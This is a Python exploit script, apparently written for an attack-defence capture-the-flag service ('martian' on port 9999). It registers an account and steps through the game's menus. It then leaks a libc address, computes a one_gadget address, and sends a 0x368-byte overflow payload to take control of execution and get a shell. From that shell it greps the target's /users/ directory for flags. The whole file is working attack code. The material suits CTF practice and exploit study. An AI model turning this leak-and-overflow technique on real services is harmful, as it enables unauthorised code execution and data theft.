#!/usr/bin/env python
from sploit_lib import *
import re
import sys
from time import sleep

ip = sys.argv[1]
flag_regexp = r"[A-Z0-9]{31}="

leak_offset = 0x3eba00
one_shot = 0x10a38c

if __name__ == "__main__":

	p = remote( ip, 9999 )
	#p = process( "./martian" )
	#gdb.attach( p )

	username, password = generate_correct_random_name(), generate_correct_random_password()
	#print "{+} Create account with name <%s> and password <%s>" % ( username, password )

	reg_user( p, username, password )
	login( p, username, password )

	read_book( p, 24 )
	go_to_next_day( p )

	easy_raid( p )
	go_to_next_day( p )
	go_to_next_day( p )
	go_to_next_day( p )

	# regen HP
	for i in range( 4 ):
		eat_potato( p )

	medium_raid( p )
	go_to_next_day( p )

	# leak pie/libc/stack
	p.recvuntil( "[>] " )
	p.send( "8\n" )
	p.recvuntil( ": " )
	p.send( "y\n" )

	for i in range( 16 ):
		p.recvuntil( ": " )
		p.send( "-\n" )

	#p.interactive()
	buf = p.recvuntil( "[>] " )
	buf = buf.split( '\n' )
	part1, part2 = int( buf[ 4 ].split( " = " )[ 1 ] ), int( buf[ 5 ].split( " = " )[ 1 ] )

	#print part1, part2

	leak = part1 * 0x100000000 + part2
	base = leak - leak_offset

	#print "libc_leak = 0x%x" % leak
	#print "libcb_base = 0x%x" % base

	one_gadget = base + one_shot

	# go to hard raid
	p.send( "7\n" )
	p.recvuntil( ": " )
	p.send( "3\n" )

	while True:
		buf = p.recvuntil( "> " )

		if "Nowhere to run!" in buf:
			p.send( "4\n" )
			break

		p.send( "1\n" )

	p.recvuntil( ": " )

	payload = "a" * 0x368
	payload += p64( one_gadget )
	payload += '\x00' * 0x100

	p.send( payload + '\n' )
	p.send( "egrep -r '[A-Z0-9]{31}=' /users/\n" )

	buf = p.recv()
	print re.findall( flag_regexp, buf )
    sys.stdout.flush()

	p.close()